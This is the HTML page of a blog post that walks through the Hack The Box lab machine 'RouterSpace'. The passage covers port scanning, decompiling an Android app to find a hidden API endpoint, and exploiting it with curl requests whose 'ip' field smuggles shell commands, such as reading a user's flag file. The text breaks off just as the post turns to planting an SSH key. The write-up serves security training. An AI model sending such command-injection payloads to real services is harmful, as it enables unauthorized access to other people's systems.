@@ -1,0 +1,568 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css" integrity="sha256-/4UQcSmErDzPCMAiuOiWPVVsNN2s3ZY/NsmXNcj0IFc=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"fdlucifer.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.15.0","exturl":true,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="introduceOS:	 LinuxDifficulty:	EasyPoints:	20Release:	26 Feb 2022IP:	10.10.11.148">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hack-The-Box-walkthrough[routerspace]">
+<meta property="og:url" content="https://fdlucifer.github.io/2022/03/02/routerspace/index.html">
+<meta property="og:site_name" content="lUc1f3r11&#39;s blog">
+<meta property="og:description" content="introduceOS:	 LinuxDifficulty:	EasyPoints:	20Release:	26 Feb 2022IP:	10.10.11.148">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2164.jpg">
+<meta property="og:image" content="http://www.hackthebox.eu/badge/image/235857">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2165.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2166.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2167.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2168.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2169.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2170.jpg">
+<meta property="article:published_time" content="2022-03-02T11:40:00.000Z">
+<meta property="article:modified_time" content="2022-07-09T15:41:15.312Z">
+<meta property="article:author" content="lUc1f3r11">
+<meta property="article:tag" content="HackTheBox靶机练习">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2164.jpg">
+
+
+<link rel="canonical" href="https://fdlucifer.github.io/2022/03/02/routerspace/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://fdlucifer.github.io/2022/03/02/routerspace/","path":"2022/03/02/routerspace/","title":"Hack-The-Box-walkthrough[routerspace]"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Hack-The-Box-walkthrough[routerspace] | lUc1f3r11's blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">lUc1f3r11's blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">by lUc1f3r11</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">42</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">32</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">203</span></a></li><li class="menu-item menu-item-schedule"><a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>Schedule</a></li><li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>Sitemap</a></li><li class="menu-item menu-item-commonweal"><a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>Commonweal 404</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#introduce"><span class="nav-number">1.</span> <span class="nav-text">introduce</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Enumeration"><span class="nav-number">2.</span> <span class="nav-text">Enumeration</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#NMAP"><span class="nav-number">2.1.</span> <span class="nav-text">NMAP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#way1-to-solve-apk-static"><span class="nav-number">2.2.</span> <span class="nav-text">way1 to solve apk (static)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#way2-to-solve-apk-dynamic"><span class="nav-number">2.3.</span> <span class="nav-text">way2 to solve apk (dynamic)</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Root-own"><span class="nav-number">3.</span> <span class="nav-text">Root own</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Summary-of-knowledge"><span class="nav-number">4.</span> <span class="nav-text">Summary of knowledge</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Contact-me"><span class="nav-number">5.</span> <span class="nav-text">Contact me</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="lUc1f3r11"
+      src="/images/lucifer11.jpg">
+  <p class="site-author-name" itemprop="name">lUc1f3r11</p>
+  <div class="site-description" itemprop="description">All things about infosec & ctf</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">203</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">32</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">42</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;FDlucifer"><i class="fab fa-github fa-fw"></i>GitHub</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="bWFpbHRvOjExODUxNTE4NjdAcXEuY29t" title="E-Mail → mailto:1185151867@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;fdlucifer11"><i class="fab fa-twitter fa-fw"></i>Twitter</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3Byb2ZpbGUucGhwP2lkPTEwMDAxOTY5NDUyODYyMA==" title="FB Page → https:&#x2F;&#x2F;www.facebook.com&#x2F;profile.php?id&#x3D;100019694528620"><i class="fab fa-facebook fa-fw"></i>FB Page</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cueW91dHViZS5jb20vY2hhbm5lbC9VQ19saVRlaDRSMUZNYnBWeGxwTWUtdnc=" title="YouTube → https:&#x2F;&#x2F;www.youtube.com&#x2F;channel&#x2F;UC_liTeh4R1FMbpVxlpMe-vw"><i class="fab fa-youtube fa-fw"></i>YouTube</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS95YW5nODkyOS8=" title="Instagram → https:&#x2F;&#x2F;www.instagram.com&#x2F;yang8929&#x2F;"><i class="fab fa-instagram fa-fw"></i>Instagram</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9pbmZvc2VjLmV4Y2hhbmdlL0BsVWMxZjNyMTE=" title="infosec.exchange → https:&#x2F;&#x2F;infosec.exchange&#x2F;@lUc1f3r11"><i class="custom mastodon fa-fw"></i>infosec.exchange</span>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <span class="exturl cc-opacity" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/big/by_nc_sa.svg" alt="Creative Commons"></span>
+  </div>
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="Back to top">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+
+    
+    <div class="sidebar-inner sidebar-blogroll">
+      <div class="links-of-blogroll animated">
+        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+          Links
+        </div>
+        <ul class="links-of-blogroll-list">
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly9hdHN1ZDAubWUv" title="https:&#x2F;&#x2F;atsud0.me&#x2F;">atsud0</span>
+            </li>
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly9kcm9pZGthbGkuZ2l0aHViLmlvLw==" title="https:&#x2F;&#x2F;droidkali.github.io&#x2F;">记忆里的纯真</span>
+            </li>
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly94aWFvbGltYXJzLndvcmRwcmVzcy5jb20v" title="https:&#x2F;&#x2F;xiaolimars.wordpress.com&#x2F;">小离</span>
+            </li>
+        </ul>
+      </div>
+    </div>
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://fdlucifer.github.io/2022/03/02/routerspace/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/lucifer11.jpg">
+      <meta itemprop="name" content="lUc1f3r11">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="lUc1f3r11's blog">
+      <meta itemprop="description" content="All things about infosec & ctf">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Hack-The-Box-walkthrough[routerspace] | lUc1f3r11's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Hack-The-Box-walkthrough[routerspace]
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2022-03-02 19:40:00" itemprop="dateCreated datePublished" datetime="2022-03-02T19:40:00+08:00">2022-03-02</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2022-07-09 23:41:15" itemprop="dateModified" datetime="2022-07-09T23:41:15+08:00">2022-07-09</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/HackTheBox-walkthrough/" itemprop="url" rel="index"><span itemprop="name">HackTheBox walkthrough</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h1 id="introduce"><a href="#introduce" class="headerlink" title="introduce"></a>introduce</h1><p>OS:	 Linux<br>Difficulty:	Easy<br>Points:	20<br>Release:	26 Feb 2022<br>IP:	10.10.11.148</p>
+<ul>
+<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2164.jpg"></p>
+</li>
+<li><p><img src="http://www.hackthebox.eu/badge/image/235857" alt="my htb rank"></p>
+</li>
+</ul>
+<span id="more"></span>
+
+<h1 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h1><h2 id="NMAP"><a href="#NMAP" class="headerlink" title="NMAP"></a>NMAP</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/routerspace]</span><br><span class="line">└─<span class="comment"># nmap -sV -v -p- -Pn --min-rate=10000 10.10.11.148</span></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     (protocol 2.0)</span><br><span class="line">80/tcp open  http</span><br></pre></td></tr></table></figure>
+
+<p>we don’t find any thing interesting on port or main page…</p>
+<p>but we find a place to download a apk</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://routerspace.htb/RouterSpace.apk</span><br></pre></td></tr></table></figure>
+
+<h2 id="way1-to-solve-apk-static"><a href="#way1-to-solve-apk-static" class="headerlink" title="way1 to solve apk (static)"></a>way1 to solve apk (static)</h2><p>The obvious route is to look at the apk provided to us by clicking download in the top right. We can decompile this into it’s respective source code and take a look around. We use apktool for this:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apktool d RouterSpace.apk </span><br></pre></td></tr></table></figure>
+
+<p>We can also use online decompilers:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.javadecompilers.com/apk</span><br></pre></td></tr></table></figure>
+
+<p>Looking into the certificate on the apk we see there’s a domain listed:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">APK is signed</span><br><span class="line">v1 signature: True</span><br><span class="line">v2 signature: True</span><br><span class="line">v3 signature: False</span><br><span class="line">Found 1 unique certificates</span><br><span class="line">Subject: C=SL, ST=Colombo, L=Colombo, O=routerspace.htb, OU=routerspace, CN=routerspce</span><br><span class="line">Signature Algorithm: rsassa_pkcs1v15</span><br><span class="line">Valid From: 2021-11-18 13:15:21+00:00</span><br><span class="line">Valid To: 2049-04-05 13:15:21+00:00</span><br><span class="line">Issuer: C=SL, ST=Colombo, L=Colombo, O=routerspace.htb, OU=routerspace, CN=routerspce</span><br><span class="line">Serial Number: 0x5a411405</span><br><span class="line">Hash Algorithm: sha256</span><br><span class="line">md5: 214a9b17352972333ddf5e4bbfe0e2ad</span><br><span class="line">sha1: 23c88a23819858a82a402def82eb92ba188a909d</span><br><span class="line">sha256: dac3cc454169abcec3707c5842e197c1f80968f0f701621588666e84131a9673</span><br><span class="line">sha512: 82d9685f4219b492c10bcb3b1812afb8e6d589e653fc9df8f3e9e75a99cec037a10be188626a337c0e969dd86bbef63b371124d9fec53dcfabc0a62671cbafee</span><br><span class="line">PublicKey Algorithm: rsa</span><br><span class="line">Bit Size: 2048</span><br><span class="line">Fingerprint: a68fda1a5a8ab411bc1483ff94d7c31c440190e917a283acb55725d32ed19148</span><br></pre></td></tr></table></figure>
+
+<p>Looking through the files, we see there’s a index.android.bundle file, we can extract this using npx or we can copy all of it’s contents over to</p>
+<ul>
+<li><span class="exturl" data-url="aHR0cHM6Ly9iZWF1dGlmaWVyLmlvLw==">Online JavaScript Beautifier<i class="fa fa-external-link-alt"></i></span></li>
+</ul>
+<p>After searching through all references to routers, we find:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">_0x31d2</span></span>() &#123;</span><br><span class="line">    var _0x379495 = [<span class="string">&#x27;EwCVL&#x27;</span>, <span class="string">&#x27;ugPGw&#x27;</span>, <span class="string">&#x27;Router is &#x27;</span>, <span class="string">&#x27;-Bold&#x27;</span>, <span class="string">&#x27;data&#x27;</span>, <span class="string">&#x27;30158095HXLvSs&#x27;</span>, <span class="string">&#x27;post&#x27;</span>, <span class="string">&#x27;eAgent&#x27;</span>, <span class="string">&#x27;http://rou&#x27;</span>, <span class="string">&#x27;10BrHGoD&#x27;</span>, <span class="string">&#x27;gray&#x27;</span>, <span class="string">&#x27;80%&#x27;</span>, <span class="string">&#x27;applicatio&#x27;</span>, <span class="string">&#x27;white&#x27;</span>, <span class="string">&#x27;ck your in&#x27;</span>, <span class="string">&#x27;ternet con&#x27;</span>, <span class="string">&#x27;tb/api/v4/&#x27;</span>, <span class="string">&#x27;Please pro&#x27;</span>, <span class="string">&#x27;Image&#x27;</span>, <span class="string">&#x27;XvhFJ&#x27;</span>, <span class="string">&#x27;2111347AIyazK&#x27;</span>, <span class="string">&#x27;v/check/de&#x27;</span>, <span class="string">&#x27;vide an IP&#x27;</span>, <span class="string">&#x27;working fi&#x27;</span>, <span class="string">&#x27;DKyDg&#x27;</span>, <span class="string">&#x27;YnNsf&#x27;</span>, <span class="string">&#x27;tzoEq&#x27;</span>, <span class="string">&#x27;EKNxl&#x27;</span>, <span class="string">&#x27;the server&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;ne!.&#x27;</span>, <span class="string">&#x27;NunitoSans&#x27;</span>, <span class="string">&#x27;OgZoU&#x27;</span>, <span class="string">&#x27;TouchableO&#x27;</span>, <span class="string">&#x27;32457sfggQZ&#x27;</span>, <span class="string">&#x27;nection.&#x27;</span>, <span class="string">&#x27;[ RESPOND &#x27;</span>, <span class="string">&#x27;center&#x27;</span>, <span class="string">&#x27;createElem&#x27;</span>, <span class="string">&#x27;__esModule&#x27;</span>, <span class="string">&#x27;per&#x27;</span>, <span class="string">&#x27;mGNnc&#x27;</span>, <span class="string">&#x27;then&#x27;</span>, <span class="string">&#x27;catch&#x27;</span>, <span class="string">&#x27;contain&#x27;</span>, <span class="string">&#x27;uAiCt&#x27;</span>, <span class="string">&#x27;bottom&#x27;</span>, <span class="string">&#x27;42740dmWhFN&#x27;</span>, <span class="string">&#x27;Text&#x27;</span>, <span class="string">&#x27;ButtonWrap&#x27;</span>, <span class="string">&#x27;OLDvc&#x27;</span>, <span class="string">&#x27;Sorry !&#x27;</span>, <span class="string">&#x27;terspace.h&#x27;</span>, <span class="string">&#x27;n/json&#x27;</span>, <span class="string">&#x27;StyleSheet&#x27;</span>, <span class="string">&#x27;/router/de&#x27;</span>, <span class="string">&#x27;darkgray&#x27;</span>, <span class="string">&#x27;JHvFI&#x27;</span>, <span class="string">&#x27;transparen&#x27;</span>, <span class="string">&#x27;UWIVj&#x27;</span>, <span class="string">&#x27;Please che&#x27;</span>, <span class="string">&#x27;SZqEq&#x27;</span>, <span class="string">&#x27;default&#x27;</span>, <span class="string">&#x27;HrHYj&#x27;</span>, <span class="string">&#x27;Hey !&#x27;</span>, <span class="string">&#x27;monitoring&#x27;</span>, <span class="string">&#x27;StatusBar&#x27;</span>, <span class="string">&#x27;error&#x27;</span>, <span class="string">&#x27;1013605BwxVJG&#x27;</span>, <span class="string">&#x27;[ DEBUG ] &#x27;</span>, <span class="string">&#x27;defineProp&#x27;</span>, <span class="string">&#x27;gUnlE&#x27;</span>, <span class="string">&#x27;Unable to &#x27;</span>, <span class="string">&#x27;25%&#x27;</span>, <span class="string">&#x27;pacity&#x27;</span>, <span class="string">&#x27;ButtonText&#x27;</span>, <span class="string">&#x27;gKQYs&#x27;</span>, <span class="string">&#x27;1006000MsdmAT&#x27;</span>, <span class="string">&#x27;handleSubm&#x27;</span>, <span class="string">&#x27;PpdRl&#x27;</span>, <span class="string">&#x27;shxxV&#x27;</span>, <span class="string">&#x27;ent&#x27;</span>, <span class="string">&#x27;View&#x27;</span>, <span class="string">&#x27;erty&#x27;</span>, <span class="string">&#x27;show&#x27;</span>, <span class="string">&#x27;Formik&#x27;</span>, <span class="string">&#x27;Check Stat&#x27;</span>, <span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="string">&#x27;128BJBUSC&#x27;</span>, <span class="string">&#x27;6BAxhAU&#x27;</span>, <span class="string">&#x27;4584186MTHGwP&#x27;</span>, <span class="string">&#x27;connet to &#x27;</span>, <span class="string">&#x27;vESlr&#x27;</span>, <span class="string">&#x27;GHjuW&#x27;</span>, <span class="string">&#x27; Address.&#x27;</span>, <span class="string">&#x27;container&#x27;</span>, <span class="string">&#x27;create&#x27;</span>, <span class="string">&#x27;RouterSpac&#x27;</span>, <span class="string">&#x27;viceAccess&#x27;</span>, <span class="string">&#x27;72dIvHGU&#x27;</span>, <span class="string">&#x27;info&#x27;</span>];</span><br><span class="line">    _0x31d2 = <span class="function"><span class="title">function</span></span> () &#123;</span><br><span class="line">        <span class="built_in">return</span> _0x379495;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="built_in">return</span> _0x31d2();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Looking into it, we get the following string:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://routerspace.htb/api/v4/monitoring/router/dev/check/deviceAccess</span><br></pre></td></tr></table></figure>
+
+<p>We still can’t access this due to the WAF however sending POST requests gives us a different output:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST http://routerspace.htb/api/v4/monitoring/router/dev/check/deviceAccess -H <span class="string">&#x27;Content-Type: application/json&#x27;</span> -H <span class="string">&quot;User-Agent: RouterSpaceAgent&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>We get undefined, we can try send data and see what happens:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">&lt;<span class="built_in">head</span>&gt;</span><br><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">&lt;title&gt;Error&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;pre&gt;SyntaxError: Unexpected token r <span class="keyword">in</span> JSON at position 0&lt;br&gt; &amp;nbsp; &amp;nbsp;at JSON.parse (&amp;lt;anonymous&amp;gt;)&lt;br&gt; &amp;nbsp; &amp;nbsp;at createStrictSyntaxError (/opt/www/public/routerspace/node_modules/body-parser/lib/types/json.js:158:10)&lt;br&gt; &amp;nbsp; &amp;nbsp;at parse (/opt/www/public/routerspace/node_modules/body-parser/lib/types/json.js:83:15)&lt;br&gt; &amp;nbsp; &amp;nbsp;at /opt/www/public/routerspace/node_modules/body-parser/lib/read.js:121:18&lt;br&gt; &amp;nbsp; &amp;nbsp;at invokeCallback (/opt/www/public/routerspace/node_modules/raw-body/index.js:224:16)&lt;br&gt; &amp;nbsp; &amp;nbsp;at <span class="keyword">done</span> (/opt/www/public/routerspace/node_modules/raw-body/index.js:213:7)&lt;br&gt; &amp;nbsp; &amp;nbsp;at IncomingMessage.onEnd (/opt/www/public/routerspace/node_modules/raw-body/index.js:273:7)&lt;br&gt; &amp;nbsp; &amp;nbsp;at IncomingMessage.emit (events.js:203:15)&lt;br&gt; &amp;nbsp; &amp;nbsp;at endReadableNT (_stream_readable.js:1145:12)&lt;br&gt; &amp;nbsp; &amp;nbsp;at process._tickCallback (internal/process/next_tick.js:63:19)&lt;/pre&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>We can try different methods of RCE:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/routerspace]</span><br><span class="line">└─<span class="comment"># curl -X POST http://routerspace.htb/api/v4/monitoring/router/dev/check/deviceAccess -H &#x27;Content-Type: application/json&#x27; -H &quot;User-Agent: RouterSpaceAgent&quot; -d &#x27;&#123;&quot;ip&quot;:&quot;127.0.0.1; whoami&quot;&#125;&#x27;</span></span><br><span class="line"><span class="string">&quot;127.0.0.1\npaul\n&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>We find that we’re already the user and can grab our flag:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/routerspace]</span><br><span class="line">└─<span class="comment"># curl -X POST http://routerspace.htb/api/v4/monitoring/router/dev/check/deviceAccess -H &#x27;Content-Type: application/json&#x27; -H &quot;User-Agent: RouterSpaceAgent&quot; -d &#x27;&#123;&quot;ip&quot;:&quot;127.0.0.1; cat /home/paul/user.txt&quot;&#125;&#x27;</span></span><br><span class="line"><span class="string">&quot;127.0.0.1\n0d729d90407e80b1ea452738901b01db\n&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>If we want a shell, we can generate an ssh key pair and add it to &#x2F;home&#x2F;paul&#x2F;.ssh&#x2F;authorized_keys:</p>
